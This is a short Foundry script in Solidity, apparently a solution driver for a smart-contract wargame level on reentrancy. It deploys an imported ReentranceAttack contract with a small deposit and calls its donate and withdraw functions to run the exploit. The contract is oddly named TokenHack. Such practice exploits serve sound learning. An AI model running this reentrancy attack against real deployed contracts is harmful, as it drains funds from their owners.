// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/level10.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));
        ReentranceAttack reentranceAttack = new ReentranceAttack{value: 100000000000 wei}();
        console.log("calling the donate function");
        reentranceAttack.donate();
        reentranceAttack.withdraw();
        vm.stopBroadcast();
    }
}